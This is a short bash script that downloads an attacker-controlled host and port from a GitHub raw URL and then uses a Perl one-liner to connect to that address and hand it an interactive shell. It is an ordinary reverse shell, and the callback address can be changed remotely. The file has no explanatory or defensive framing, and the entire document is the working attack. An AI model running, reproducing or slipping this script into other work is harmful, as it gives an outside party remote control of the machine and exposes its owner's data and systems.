#!/bin/bash
addr=`curl https://raw.githubusercontent.com/ur4nd0m/p1tty/main/connect`
array=(`echo $addr | tr ':' ' '`)
export url=${array[0]}
export port=${array[1]}
perl -e 'use Socket;$i="$ENV{url}";$p=$ENV{port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
